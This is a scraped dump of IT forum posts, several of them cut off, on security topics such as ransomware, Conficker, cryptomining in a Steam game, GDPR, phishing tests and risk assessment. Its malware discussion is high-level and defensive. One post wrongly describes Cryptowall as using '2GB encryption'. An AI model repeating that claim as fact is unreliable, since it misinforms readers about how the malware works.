detection).16) Kill chainOriginally coined by Lockheed Martin to bring a military analog to computer defense, it refers to the steps in a successful breach from the perspective of someone trying to stop it as early as possible.17) Machine learningMachines work their way through new data in known formats, make judgements, then try to extend them to new situations.18) Nation state adversariesWhat the bad guys in the Die Hard movies always pretend to be, even though they’re really just in it for the money. A bit of a hobgoblin, they’re differentiated from traditional hacking groups by the specter of serious investment and nefarious, geopolitical aims.19) Next-genAny new version of an older technology that’s gotten stale and needs a makeover.20) Potentially Unwanted Application/Programs (PUAs/PUPs)Applications unwitting users sometimes find on their systems, designed to mine their data and serve them annoying advertisements. Sometimes they come part and parcel with something decent.21) Real-timeGenerally used to mean, “Fast. Like totally, seriously fast!”22) Risk managementUnderstanding what you have to be so worried about.23) Silent hackingIf I want the information I steal from you to actually stay usable for a while, it’s in my best interest to keep my hack quiet.24) Threat intelligenceYou show me the attacks and threat actors on your radar and I’ll show you mine. Cathartic (if not always helpful), these services keep CISO’s informed on what to look out for and how to justify additional budget.25) Unified threat management (UTM)The Voltron of network security. Combines various security functionality in one place to simplify management and monitoring.Any other buzzword definitions you guys have? Let us know in the comments!",12

693627,Securing Mobile Devices- small technologies big issues,"I received a letter form my healthcare provider informing me 6 laptops had recently been stolen from an office and that my medical records had been compromised due to the theft.

A recent Security Info Watch blog also reported that ""mobile devices were among the most prominent locations where PHI was stored in 222 reported breaches to OCR in 2012"", this included 60 laptop lefts affecting 654,158 individuals. I don't think anyone can argue that mobile devices can be a week point in securing potentially sensitive content. ﻿With devices becoming smaller and budgets/ protocols under scrutiny, what can be done? The pro-active facilities I've been around start their risk/threat analysis with a plan on how to first physically secure their mobile devices as well as access points. Hospitals are big places and things can be misplaced, relocated without authorization or unfortunately stolen too often by someone internally. Assisting in the discussion and providing free physical security evaluations and proposals is a big part of my role and one I've seen pay off.

1038340,CryptoVirus or User Error,"Here is the situation:Got in to work today, co worker tells me that her entire departments folder has vanished from our storage server. We have a very simple 3 TB NAS for staff storage. It is backed up using one of two external USB drives which are rotated every week, so that one backup no more than a week old is offline and stored in a secure location... aka my house.Files on our storage server are not immediately deleted when a staff member deletes them. They go to a ""trashbox"" first, located within the parent folder of the share. I found the missing fold in the trashbox, although the files were not complete. Many were either missing or were corrupted / temporary files. Some were named random alphanumeric strings with .tmp extensions, others were named the actual file, but with ~ in front, and only 1 KB in size.To me, this looks VERY much like someone accidentally selected every folder in this storage share and hit ""delete"", realized that they screwed up, and then hit ""cancel"". This is further supported by the fact that the missing folder was the first folder in terms of alphabetic order. I looked at the backups. All backups are fine, went off with no problem, and I have restored the missing data from there. There are no logs other than the backup logs. There is no way for me to tell who did this that I can find.Is there any possibility that this was virus related, or was it just user stupidity? No one has fessed up yet. I'm totally OK with this being a user goof up, as I have already restored what needed to be restored and everything looks fine.

2152205,“Abstractism” Steam game pulled after cyrptomining accusations,"Reports have recently shown that the Steam game, “Abstractism”, has been pulled by Valve’s online Steam store after allegations were made that it was exploiting players’ computer resources to mine cryptocurrency. Players of “Abstractism”, generally a simplistic game, raised red flags as it was oddly consuming a lot of processing power from their CPUs and GPUs.  Players like SidAlpha, a YouTuber, detailed his suspicions on a video: https://www.youtube.com/watch?v=xClkx9UzsmETo raise a couple more eyebrows, the developer of the game even encouraged players to keep their software running for as long as possible:“Drop time is dynamic and increases after each drop (you need 15 minutes to receive the first drop, 30 minutes for the second drop, 60 minutes for the third drop and so on).You receive more rare items if your playtime is long (“60 minutes” item drops are better than “15 minutes” drops)”If they were cryptomining, of course, running the software for long periods of time would be in the best interest of this developer for them to accomplish this task…Along with a number of other suspicions, Valve made the call to remove “Abstractism” and ban the developer from Steam for “shipping unauthorised code, trolling, and scamming customers with deceptive in-game items.”Looks like these suspected cryptominer got pretty creative with their reach. Where do you think cryptojacking will strike next? And, for all you gamers out there, how does cryptojacking affect any future game playing? ",0

Additionally, we have a secondary ISP with available static IPs- I tried one of those IPs as well- nope.

2145048,"The Good, The Bad, and The Ugliest of GDPR So Far","Our Chief Security Scientist shares what has happened so far with the launch of GDPR and with the latest Exactis breach, we may be seeing a GDPR-like regulation here in the US.Finally, the time has come. May 25th 2018 is now in the past, and the EU GDPR has come into effect after a two-year transition period. The earth is still rotating, the internet still kind of works.So what has happened, and have any lessons been learned yet?EU GDPR and Data Privacy Email SPAM MONTHWell firstly, we all lived through “spam month” as EU GDPR and Privacy updates poured into our inboxes. Almost every company waited until weeks or days before GDPR went into effect to notify all the individuals whose data they collect and process. This meant we received hundreds of emails from companies whose services we frequently use—and just as many from companies we didn’t even know about! Were you taken by surprise when you realized how many companies you rarely associate with store your personal information?Some got it right, and others got it wrong. Badly wrongIt became apparent that many companies did a poor job of obtaining and maintaining our consent in the first place. We know this because when they updated their privacy policies to cover GDPR they also asked our permission to continue contact. Regardless, I’ve seen companies who have done it the right way—providing clear information about what data they collect, how it will be used, and requiring an explicit opt-in to continue the relationship. But I’ve also seen companies doing it badly, meaning if they do not hear from you within a specific time frame they will assume you’ve opted in. Important lessons can be learned from pre-GDPR consent policies and it will be interesting to see how these companies have interpreted GDPR.Wow, my inbox is now free of SPAM and my Delete Button is on vacationUp until May 25th, 2018, my inbox was getting hit hard with the policy updates and messages begging me to continue receiving emails and services. I have been very selective about which companies received my opt-in to continue receiving emails. Some give you no choice—you had to opt-in to continue using the services. And then May 26th, 2018 arrived and my inbox is almost SPAM free! Even cybercriminals appear to be compliant with consent.And my delete button has surely had a break from having to delete all those useless emails.GPDR claims it first victims with an $8.8 Billion lawsuit As May 26th arrived we started to see some of the impact from GDPR. Facebook and Google became to first victims of a massive lawsuit, potentially worth $8.8 billion, on the very first day. It was filed by Max Schrems, an Austrian Data Privacy activist, who has been successful in previous years and is a critic of companies who collect and abuse surveillance of personal data on a massive scale. Both Facebook and Google updated their policies, but Max Schrems claims those do not go far enough to protect the privacy of the millions of EU Citizens they serve. During the recent Cambridge Analytica saga Mark Zuckerberg’s notes (which got leaked during the hearing with Congress) made it obvious that Facebook had not done enough to comply with GDPR. So the question is, what happens next? Some companies shut down and closed their doors to the EU    Yes, some companies decided it was not possible to comply so they shut down their services to EU Citizens. Well, not exactly. They just blocked EU regions which does not necessarily mean they won’t gather EU citizens personal data, but instead will limit the amount of Personal Information they gather. The Washington Post added a fee for EU Citizens for an advertisement-free service (to avoid having their data tracked) and several other companies removed access completely.GDPR makes it difficult to catch cyber criminals!ICANN (The Internet Corporation for Assigned Names and Numbers) is the organization responsible maintaining databases and namespaces of the internet and operates the Internet Protocol numbers and DNS (Domain Name System). One of the major tools used for tracking illegal website operators was ICANN’s Whois Lookup. It provided contact details and the email address of any person who registered a domain name, but it did not comply with the EU GDPR regulation. So ICANN was forced to remove this capability meaning that law enforcement, cyber security researchers and investigators now have a more difficult challenge in identifying owners of illegal websites that are carrying out malicious activities. ICANN did request an exclusion or exemption, though they failed, so the impact has been felt on day 1 of GDPR.Here’s one of my favorite examples on the impact of GDPR: The Summary, both good and badWhile GDPR has introduced a multitude of challenges for companies when it comes to providing services to EU Citizens and collecting personal information, it has also made those companies examine the data they are collecting and consider security. So yes, GDPR has made a positive impact, and while it is not perfect it has forced companies to do more to protect the personal data they have been entrusted with. Some of these challenges negatively affect law enforcement and cyber security researchers trying to make the internet a safer place, however, they can be overcome while keeping GDPR in place and successful. In the end, it is up to us to make the world and the internet a safer, secure place where we do not get abused. P.S. Enjoyed this post?

1505596,Don’t Be Held Hostage by Ransomware: How to Stand Up to Cryptowall,"     After February, it is hard to talk about computer security without the word “Cryptowall” being brought up.  In February, Hollywood Presbyterian Medical Center was hit by this strain of infection and forced to pay the ransom to get critical client data back from the attackers. Many do not understand the nature of the infection, looking only to the result, which is heavily encrypted files.  When you trace back the infection, the details you learn are almost as important as knowing that you have been hit by the infection. It reminds me of the saying “An ounce of prevention is worth a pound of cure.”  Take a look at these findings and ideas I have put together based on interacting with tons of IT Management and staff. I think they’ll save you a ton of time, not to mention reduce stress.  You might even get to take a day off, eventually.What IS Cryptowall?    Cryptowall is an infection that will encode your files with heavy encryption so they cannot be used until the ransom is paid to the attacker.  The files affected are personal files, like Pictures, Documents, and PDFs.  Normally, it does not encrypt Windows files, as they would like your machine to be operational enough to pay the ransom.  The infection uses Windows Encryption services to encrypt files with up to 2GB encryption, which is nearly unbreakable.     Many times, in an enterprise environment, a Server is affected, however, the infection originates on a Client machine and affects the user’s mapped drives. Determining the user that started the infection can be difficult, though many times the owner of the generated Help_Decrypt or Restore_Files documents is the user that started the infection.  From that client machine, you would investigate the system and registry, trying to locate any dropped files and possibly an encryption key if the writer was careless or the power was unplugged from the machine while the infection was active.  You may even get lucky and identify a registry key in ﻿HKCU/Software﻿ that contains a list of the encrypted files that the infection has touched.     There are many variants; here at ESET we detect the infection as Filecoder.  There are many variants and infections that have the same end result of encrypted files, such as Teslacrypt, Cryptowall 1.0-4.0, and even some that are now popping up as a SAAS (Software as a Service) complete with customer service of some sort to facilitate payment and answer questions on hopes of getting you to pay.  Last year, a younger hacker by the handle of Tox created an underground site that did just that, Ransomware as a Service.  The site allowed the users to create a Crypto virus, package it, and distribute it in exchange for a portion of the ransom. Due to its publicity, Tox eventually sold the site to a buyer for $5,000, according to a report on BusinessInsider.com.Why Was I Infected?﻿     The first thing I am normally asked when viewing a site that has been infected is “How?” How did the infection get past my defenses and infect my servers?  There are many ways, but normally, it is due to weak applications on the system. This is why, in many instances, the first place I will visit when investigating a system is the Add/Remove programs area.  Here, I am normally greeted by an out-of-date Adobe or Java installation. Even with antivirus, these weak applications can be attacked using a buffer overflow or other means to make the application itself execute malicious code.     Even more frightening, some of the exploit kits leave no files on the system, such as with the Angler and Nuclear Exploit kits. They can deliver a payload of Cryptowall, Teslacrypt, or other variants by obfuscating javascript code on infected websites in a “Drive by download” attack or leverage the use of macros in Outlook or other email clients to infect the system, again, with leaving no files other than the Help_Decrypt or Help_Your_Files once the encryption process has already started.  Even worse, they are very easy to use and anyone can buy them.  Patch management is key, and though it is a pain, it can end up saving you from dealing with an infection like this.Recovery and Prevention    If you have been affected by the virus, you’ll need to clean your system, restore your files and get everything back in order.  These tips will help you to prevent these types of infections and get back on your feet should you ever encounter another one.Backup Software - A good backup solution should support versioning, so you can get a clean copy of the files back.  If it does not, and you run another backup, you may end up restoring encrypted files OR your files may be overwritten with an encrypted copy.  You can try to use something like Shadow Explorer to browse the Windows Shadow volumes on Windows Server 2008 and above builds, but many times this is erased to make the option of paying the ransom all the more enticing.  If you do not have any backup software, take a look at StorageCraft as it will allow you to restore to a good state when your files were not encrypted.Antivirus – Hopefully you already have one deployed, but ensure that your Antivirus protection is solid, updated and working.  Sometimes, the user that started the infection did not have an updated AV definition for months, leaving them vulnerable to attacks that otherwise would have been stopped.  You will want to also make sure that the policies set for your AV have the appropriate settings to block these infections.  ESET’s Live Grid is one of those settings that you will want to enable.  This system cloud sources multiple unknown detections, allowing them to be blocked even if there is not a definition written yet.  ESET has had a very good ratio of stopping infections with this system in ESET Endpoint version 5.x (latest) and Endpoint Version 6.Employee Training - One of the largest attack vectors for a hacker is the end user base. I have seen a large amount of phishing emails with malicious attachments that could have been prevented with the proper education or policies in place. These attacks prey on the users to get them to click a file to infect the network or machine, depending on infection.  Most of the time, they are blocked by the Anti-Spam systems on the network or in your email client.  If an item is not blocked by Antivirus/Anti-Spam protection, then it is up to the end user to make an educated choice of whether to open an attachment or not to.  Many times, the emails seem legitimate and would warrant reading, however, it is not often that Bank of America will send a ZIP file attachment or any kind of attachment.  As the end users make up the largest user base in any organization, training them on safe computing is a necessity.  You cannot expect a new end-user to be 100% safe online without first training them on acceptable use and what should be accessed during work hours. The training for new users should be part of your security framework, and it should be revisited often.      Restriction of Rights and Software – Many times, when a user changes positions, they take their rights with them. Instead of changing the rights to match the job, Administrators may just add rights to them, allowing them more privilege than they should have for their job.  As an administrator, I tend to go for the least amount of rights the user needs to get the job done.  If anything arises where they need more rights, it can be added.  This way, the user would be restricted from possibly executing the file as they would not have permissions to do so; or the OS would restrict the infection from dropping the payload and becoming active.  The same can be said for the Operating System, as the user should only have enough permissions on the system to do their job.  There are many types of restrictions, such as the restriction from accessing application data, and even some that are prebuilt as a GPO to prevent Cryptowall or its variants, but you will need to test and refine to get the ideal restrictions in place.﻿     Any thoughts?  Does anyone have any battle stories from the Age of Crypto?﻿  Learn more about Filecoder, Cryptowall and Cryptolocker now.﻿ ﻿",0

1632138,Is Sophos Support Always This Bad?,"We are experiencing a problem with Windows failing to recognize Sophos as being updated. Windows flags the AV as being outdated and forces a popup on all affected users:      “A program is trying to access e-mail address information stored in Outlook. If this is unexpected, click Deny and verify your antivirus software is up to date”. I consulted the google. I found a KB article that describes the issue perfectly. It turns out to be some IDE files that aren't updating like they're supposed to: https://www.sophos.com/en-us/support/knowledgebase/58307.aspx   I emailed Sophos Support on 5/6. ﻿I got a response back asking fo﻿﻿r more information, like license and product information. I provided the information and didn't hear back for a few days. I emailed again to see if they had received my information. Eventually they responded and asked for me to download and run their diagnostic utility. I did this and sent them the results on 5/11. I heard nothing by 5/16 and asked if they received the files. Heard nothing back. I emailed again and received no response so I uploaded the files through their portal on 5/17. I emailed THREE MORE TIMES without so much as a response. Finally on the 24th, I got a response but it was a workaround. I didn't want to bypass the AV check, which is what they suggested, I asked if there was a way we could actually update the files in question. I got a completely irrelevant response back. So I asked again. How do I update my IDE files? Instead of answering my question, the representative once again gave me a useless answer that didn't at all address my problem. Furthermore, I've asked in EVERY SINGLE EMAIL if anyone has looked at the log files I went through the trouble of acquiring and uploading, as per their request! No-one has bothered to contact me about the files I uploaded and the same guy that asked me to upload them hasn't answered a single time that I've asked if anyone has looked at the files yet. It is now 5/26 And I've given up on their email support. I've been sitting on hold with their automated phone system for 30 minutes now and I'm about to have to hang up because there's life going on around me and other fires to put out. All this time, my users have had to put up with the annoying popup. Luckily it's not all of my users and the ones that are affected have been good sports about it, even though it affects their productivity. Seriously, Sophos, is your support always this bad? As much grief as Symantec gets I have to say I never had a problem deploying their AV solution here and I remember having to contact their support one time and it went a lot better than this.

509300,Conficker? GO Zeus? Getting on blacklists suddenly,"Hello guys,A client is having issues that I deal with regularly which I originally found was infected with some variants of Conficker.However, the delicate balance to this is their environment has CNC machines that have integrated hardware into the CNC machine which makes upgrading the hardware/software near impossible without a new machine/manufacturing tech.So about 10 machines are running Windows 2000 which are obviously the ones that cannot be rid of Conficker.  (It keeps re-infecting the machines through file sharing)So, the remaining computers on the network almost all run Win7 and are more or less immune from Conficker, and the next problem that occured was those machines were spamming BOTNETs and get us on the CBL ABUSE RBL list.Since they have a pretty new and solid Sonicwall NSA250 firewall, I did some research and made a rule that blocks ALL destination traffic outside of the LAN to ports 445, 137,138, 139 both in UDP and TCP.I figured this would at least buy us time to work on a remedy while keeping us off the blacklists/RBL.   It worked (seemingly) for about 2-3 weeks and then yesterday I've got calls of bounced emails and it was re-listed again with CBL abust.Today it happened again, and I am baffled.  CBL abuse is claiming it is conficker that is causing the block, but I cannot understand how they can detect this issue because the conficker should in theory be unable to spam back to their 'homes' since those ports are blocked outbound.Anyone have ideas? Are their other ports it uses that I am not closing?  Could this be Gameover Zeus or another infection or some sort? I need something to buy time while we clean the network, and getting on a RBL/blacklist twice a day is causing business impacts.Thanks for any help or suggestions.",0

I know by legal requirements, I can't use Security Essentials or Defender and if I did, I'd lose reporting.I was thinking Forefront but was wondering it that was too much for a Small Business (50 workstations currently) Does it need a dedicated server, virtual server or can it run in tandem with other server apps on our main DC/File Server?We are STILL on Small Business Server 2003 for our DC/File Server with plans on a new server on 2012 before April.Any other options?Thanks...Brian",5

2138447,Fortigate blocking international IPs?,"Hey Guys,So we have a Fortigate 300d and everything is working fine for people trying to reach a particular system inside the network and outside the company. This is for a 2GB file remotely over the WAN at 3MB/sec to 3.5MB/sec which is about 10-15 minutes. I have one particular user that is overseas that is getting horrible download speed at 400 KB/s which turns out to be a couple hours. We did some traceroutes and noticed there were time outs at certain ISP peers. This is both traceroute and reverse traceroute. I'm not sure if this has anything to do with the issue. There could be firewalls that are suppressing ICMP. Anyway, doing a Matt's traceroute showed packet loss at the firewall when going to the public IP of the user. Is there a possible chance that the Fortigate could filtering packets going to certain addresses? I can have the user do a speedtest to another server here in the US, but I suspect the ISP could be throttling the connection. Any advice or suggestions? Thanks.",0
1974135,Verizon Wanted A 925 Million Discount Because Of Yahoo Hacking.,"A newly filed Schedule A proxy statement at the Securities and Exchange Commission shows that Verizon requested a discount of 925 million dollar off the original 4.83 billion purchase price because of the massive hacking scandal. The Yahoo hacking incident(s) exfiltrated the credentials of 1.5 billion users over the last years. Last year July, both parties agreed on the amount of 4,83 billion as the acquisition price. Negotiations were reopened when it became clear that attackers during two massive hacks had infiltrated Yahoo's network and grabbed 1.5 billion user names, passwords and other data. Yahoo ultimately agreed to a price of 4,48 billion, 350 million dollars less than originally agreed. The SEC form does not go into detail how this amount was established but you can imagine batallions of lawyers duking it out.Mayer Gets 23 Million Parting GiftYahoo also laid out the severance packages for executives that will be leaving the company as it sells its Internet business and emerges as an Alibaba stock-holding company called Altaba. Marissa Mayer, Yahoo's CEO, will receive a package of cash, stock, and benefits valued at a total of $23,011,325 at the completion of the deal, according to Yahoo's proxy statement. Of that, $3 million will be in cash. All this despite the hacks happening on her watch. Yahoo has never given details of how the allegedly ""nation-state"" ( I'm calling BS on that) hackers infiltrated the company's network, but experts say the most likely vector was the old reliable spoofed spear phishing attack fooling a Yahoo employee with either a malicious attachment or link that then downloaded malware which got the attackers a foothold into its network.  That one click of an untrained employee cost Yahoo dearly. Sounds like an expensive lesson to learn that you can prevent with new-school security awareness training. ",0

One of the ways that the author(s) in one of the mentioned articles lays out is to run a script that kills the share service on the data server upon detection. However, in my case, that would bring production to a screeching halt everywhere in my plant. So, I thought, instead of essentially killing access for everyone, why not just kill access for the one offending PC? I'm just not completely sure how to accomplish this.Since File Server Resource Manager allows me to run a batch or command at detection, I thought of issuing a remote command to the offending PC to do one or all of the following:Make the infected PC release its DHCP lease?Kill the sharing service on the infected PC?Delete mapped drives on the infected PC?﻿Blow up (shut down) the NIC on the infected PC?Some other way to kill network access on the infected PC that I haven't thought of, yet.Basically, I don't care if a user's PC crashes and burns, I can always rebuild it. I just don't want to have to take down the entire plant in order to stop one infection.

1639959,My Scary Phishing Test Results,"Last week we signed up to run Phishing simulations with KnowBe4 and as it turns it out it was us in I.T. that ended up learning a invaluable lesson!  About a month ago we had a user report a poorly worded by highly legitimate looking Phishing email that just so happened to have our CEO's e-mail signature down to a T.  At the time we wrote it off as the Phisher doing a copy / paste job.  Then last week when we ran our baseline test with KnowBe4 I started getting calls from users stating that they had gotten a fake email from our HR manager.  At first I wrote them off and chuckled to myself but when a user forwarded me a copy I nearly shrieked out loud when I seen that the HR managers real e-mail signature was being applied to the spoofed e-mails.  As it turns out the signature management software we run, Exclaimer Exchange Edition, bases its decision to append signatures to emails off of the 'from' field rather than the header information (seems like a flaw to me) and identified the generic HR@domain.com as one of the HR guys many e-mail aliases, and therefore appended his real e-mail signature.  This threw me for a loop and initially I thought I should cinch it before it spreads, but then had an ahha moment decided to leave it as this essentially proved beyond a shadow of a doubt that if we were under attack this is exactly what would happen for realz, after all it happened a month ago and I just hadn't put the pieces together back then. As they say, hindsight sight is 20/20. So yea, without setting forth to do so, KnowBe4 ended up exposing what I consider to be a a major weakness that we didn't know we had!  Now I'm hoping to figure out the best solution to this problem, any ideas?",11

2105506,How to Perform IT Risk Assessment,"Cybersecurity is all about understanding, managing, controlling and mitigating risk to your organization’s critical assets. Whether you like it or not, if you work in security, you are in the risk management business.To get started with IT security risk assessment, you need to answer three important questions:What are your organization’s critical information technology assets — that is, the data whose exposure would have a major impact on your business operations?What are the top five business processes that utilize or require this information?What threats could affect the ability of those business functions to operate?Once you know what you need to protect, you can begin developing strategies. However, before you spend a dollar of your budget or an hour of your time implementing a solution to reduce risk, you should be able to answer the following questions:What is the risk you are reducing?Is it the highest priority security risk?Are you reducing it in the most cost-effective way?These questions get to the heart of the problem — that it is all about risk.What is Risk?Risk is a business concept — is the likelihood of financial loss for the organization high, medium, low or zero? Three factors play into risk determination: what the threat is, how vulnerable the system is, and the importance of the asset that could be damaged or made unavailable. Thus, risk can be defined as follows:Risk = Threat x Vulnerability x AssetAlthough risk is represented here as a mathematical formula, it is not about numbers; it is a logical construct. For example, suppose you want to assess the risk associated with the threat of hackers compromising a particular system. If your network is very vulnerable (perhaps because you have no firewall and no antivirus solution), and the asset is critical, your risk is high. However, if you have good perimeter defenses and your vulnerability is low, and even though the asset is still critical, your risk will be medium.There are two special cases to keep in mind:Anything times zero is zero. If any of the factors is zero, even if the other factors are high or critical, your risk is zero.Risk implies uncertainty. If something is guaranteed to happen, it is not a risk.Here are some common ways you can suffer financial damage:Data loss. Theft of trade secrets could cause you to lose business to your competitors. Theft of customer information could result in loss of trust and customer attrition.System or application downtime. If a system fails to perform its primary function, customers may be unable to place orders, employees may be unable to do their jobs or communicate, and so on.Legal consequences. If somebody steals data from one of your databases, even if that data is not particularly valuable, you can incur fines and other legal costs because you failed to comply with the data protection security requirements of HIPAA, PCI DSS or other complianceNow let’s walk through the risk assessment procedure.Step #1: Identify and Prioritize AssetsAssets include servers, client contact information, sensitive partner documents, trade secrets and so on.  Remember, what you as a technician think is valuable might not be what is actually most valuable for the business. Therefore, you need to work with business users and management to create a list of all valuable assets. For each asset, gather the following information, as applicable:SoftwareHardwareDataInterfacesUsersSupport personnelMission or purposeCriticalityFunctional requirementsIT Security policiesIT Security architectureNetwork topologyInformation storage protectionInformation flowTechnical security controlsPhysical security environmentEnvironmental securityBecause most organizations have a limited budget for risk assessment, you will likely have to limit the scope of the project to mission-critical assets. Accordingly, you need to define a standard for determining the importance of each asset. Common criteria include the asset’s monetary value, legal standing and importance to the organization. Once the standard has been approved by management and formally incorporated into the risk assessment security policy, use it to classify each asset you identified as critical, major or minor.Step #2: Identify ThreatsA threat is anything that could exploit a vulnerability to breach security and cause harm to your organization. While hackers and malware probably leap to mind, there are many other types of threats:Natural disasters. Floods, hurricanes, earthquakes, fire and other natural disasters can destroy much more than a hacker. You can lose not only data, but the servers and appliances as well. When deciding where to house your servers, think about the chances of a natural disaster. For instance, don’t put your server room on the first floor if your area has a high risk of floods.System failure. The likelihood of system failure depends on the quality of your computer For relatively new, high-quality equipment, the chance of system failure is low. But if the equipment is old or from a “no-name” vendor, the chance of failure is much higher. Therefore, it’s wise to buy high-quality equipment, or at least equipment with good support.Accidental human interference. This threat is always high, no matter what business you are in. Anyone can make mistakes such as accidentally deleting important files, clicking on malware links, or accidentally physical damaging a piece of equipment. Therefore, you should regularly back up your data, including system settings, ACLs and other configuration information, and carefully track all changes to critical systems.Malicious humans. There are three types of malicious behavior:Interference is when somebody causes damage to your business by deleting data, engineering a distributed denial of service (DDOS) against your website, physically stealing a computer or server, and so on.Interception is classic hacking, where they steal your data.Impersonation is misuse of someone else’s credentials, which are often acquired through social engineering attacks or brute-force attacks, or purchased on the dark web.Step #3: Identify VulnerabilitiesThird, we need to spot vulnerabilities. A vulnerability is a weakness that a threat can exploit to breach security and harm your organization. Vulnerabilities can be identified through vulnerability analysis, audit reports, the NIST vulnerability database, vendor data, commercial computer incident response teams, and system software security analysis.Testing the IT system is also an important tool in identifying vulnerabilities. Testing can include the following:Information Security test and evaluation (ST&E) proceduresPenetration testing techniquesAutomated vulnerability scanning toolsYou can reduce your software-based vulnerabilities with proper patch management. But don’t forget about physical vulnerabilities. For example, moving your server room to the second floor of the building will greatly reduce your vulnerability to flooding.Step #4: Analyze ControlsAnalyze the controls that are either in place or in the planning stage to minimize or eliminate the probability that a threat will exploit vulnerability in the system. Controls can be implemented through technical means, such as computer hardware or software, encryption, intrusion detection mechanisms, and identification and authentication subsystems. Nontechnical controls include security policies, administrative actions, and physical and environmental mechanisms.Both technical and nontechnical controls can further be classified as preventive or detective controls. As the name implies, preventive controls attempt to anticipate and stop attacks. Examples of preventive technical controls are encryption and authentication devices. Detective controls are used to discover attacks or events through such means as audit trails and intrusion detection systems.Step #5: Determine the Likelihood of an IncidentAssess the probability that a vulnerability might actually be exploited, taking into account the type of vulnerability, the capability and motivation of the threat source, and the existence and effectiveness of your controls. Rather than a numerical score, many organizations use the categories high, medium and low to assess the likelihood of an attack or other adverse event.Step #6: Assess the Impact a Threat Could HaveImpact analysis should include the following factors:The mission of the system, including the processes implemented by the systemThe criticality of the system, determined by its value and the value of the data to the organizationThe sensitivity of the system and its dataThe information required to conduct an impact analysis can be obtained from existing organizational documentation, including a business impact analysis (BIA) (or mission impact analysis report, as it is sometimes called). This document uses either quantitative or qualitative means to determine the impact that would be caused by compromise or harm to the organization’s information assets.An attack or adverse event can result in compromise or loss of information system confidentiality, integrity and availability. As with the likelihood determination, the impact on the system can be qualitatively assessed as high, medium or low.The following additional items should be included in the impact analysis:The estimated frequency of the threat’s exploitation of a vulnerability on an annual basisThe approximate cost of each of these occurrencesA weight factor based on the relative impact of a specific threat exploiting a specific vulnerabilityStep #7: Prioritize the Information Security RisksFor each threat/vulnerability pair, determine the level of risk to the IT system, based on the following:The likelihood that the threat will exploit the vulnerabilityThe impact of the threat successfully exploiting the vulnerabilityThe adequacy of the existing or planned information system security controls for eliminating or reducing the riskA useful tool for estimating risk in this manner is the risk-level matrix. A high likelihood that the threat will occur is given a value of 1.0; a medium likelihood is assigned a value of 0.5; and a low likelihood of occurrence is given a rating of 0.1. Similarly, a high impact level is assigned a value of 100, a medium impact level 50, and a low impact level 10. Risk is calculated by multiplying the threat likelihood value by the impact value, and the risks are categorized as high, medium or low based on the result.Step #8: Recommend ControlsUsing the risk level as a basis, determine the actions that senior management and other responsible individuals must take to mitigate the risk. Here are some general guidelines for each level of risk:High— A plan for corrective measures should be developed as soon as possible.Medium — A plan for corrective measures should be developed within a reasonable period of time.Low — The team must decide whether to accept the risk or implement corrective actions.As you consider controls to mitigate each risk, be sure to consider:Organizational policiesCost-benefit analysisOperational impactFeasibilityApplicable regulationsThe overall effectiveness of the recommended controlsSafety and reliabilityStep #9: Document the ResultsThe final step in the risk assessment process is to develop a risk assessment report to support management in making appropriate decisions on budget, policies, procedures and so on. For each threat, the report should describe the corresponding vulnerabilities, the assets at risk, the impact to your IT infrastructure, the likelihood of occurrence and the control recommendations. Here is a very simple example:You can use your risk assessment report to identify key remediation steps that will reduce multiple risks. For example, ensuring backups are taken regularly and stored offsite will mitigate the risk of accidental file deletion and also the risk from flooding. Each of these steps should have the associated cost and should deliver real benefit in reducing the risks. Remember to focus on the business reasons for each improvement implementation.As you work through this process, you will get a better idea of how the company and its infrastructure operates and how it can operate better. Then you can create risk assessment policy that defines what the organization must do periodically (annually in many cases), how risk is to be addressed and mitigated (for example, a minimum acceptable vulnerability window), and how the organization must carry out subsequent enterprise risk assessments for its IT infrastructure components and other assets.Always keep in mind that the information security risk assessment and enterprise risk management processes are the heart of the cybersecurity. These are the processes that establish the rules and guidelines of the entire informational security management, providing answers to what threats and vulnerabilities can cause financial harm to our business and how they should be mitigated.",12

164702,latest Norton Ghost 15 and Bart PE,"evening folks, in my previous employers I have used self made Bart PE CDs with Ghost and other utilities, and I have used Hirens boot CD which works great, but uses non licenced versions of Ghost and other tools.Can anyone confirm if we buy and enterprise version of Ghost 15 (latest one) I can mix it into a Bart PE CD?   I also like to put in 7zip, Truecrypt and a few other favourite apps. I also like to image our new Dell Poweredge servers running Server 2008, for this to work, I need to mix in drivers to make the RAID and NIC cards of the server work on the boot CD, I spent hours trying to do this a month ago without sucess.I also would like to make backups of our VMware ESX server but thats a long way from being ready for producton.Symantec's support is not much good, from what I gather, they don't officially support Bart PE methods (ok understandably)   seems their support is manned by someone using CONTROL +C and V from a crib sheet. :o)Or, should I ditch Ghost and go from something else?I tried using Clonezilla for a while, which has some nice features, but needs a lot command line knowhow of Linux, and I decided its not worth using it, as its too complicated.I can make a simple batch file with Ghost so I can break the files up into ~100Mb pieces so they could be put on DVDs easier, which is why I like Ghost.",5

The sender pretends to be a tax officer working for the tax administration (Eidgenoessische Steuerverwaltung ESTV) and is asking the victim to open the attached file to answer questions about the tax declaration.The malware we break down in our most recent blog post (which includes pictures!), has been identified as the Retefe Banking Trojan. Retefe has been around for many years but has never been able to reach the scale of other banking trojans such as Dridex or Zeus. The Trojan is geographically targeted and can mostly be found in Austria, Sweden, Switzerland, Japan, with some instances of Retefe observed in the United Kingdom. Retefe utilises Credential Phishing to steal victims’ banking information, rather than watching all traffic all the time. In the case of Retefe, a fraudulent certificate is installed. The proxy, that has been configured through PowerShell, detects when the victim tries to access a targeted banking site through the browser and redirects the user to a cloned website to phish the banking credentials. The credentials are then forwarded via the TOR network to a .onion Command and Control server.",11

Education fades unless it is regularly reinforced. And even the reinforcement is liable to go 'on autopilot' and lose its effect. Security needs to become an ingrained habit to truly work, and that means it needs to be part of your company culture.Some organizations have a strong security culture, others not so much. Those are the ones you will find in the story below: 'The Worst Security Snafus Of 2012 - So Far'. If the company as a group does not care much about security, that reflects in everyone's behavior including IT's approach to security and compliance, whether they like it or not. IT in those cases often does not get the budget to do it right.Ideally, you need a security culture driven from the top down which makes sure that institutional security knowledge gets documented, retained, drilled into new employees during their onboarding, and from there on kept alive by training, events, reminders and regular security audits that will have repercussions if someone fails.  Only then the general consensus and necessity level will be high enough to make your organization a hard target that is too expensive to attack.http://www.networkworld.com/news/2012/071312-security-snafus-260874.html?Warm regards,Stu  ",1

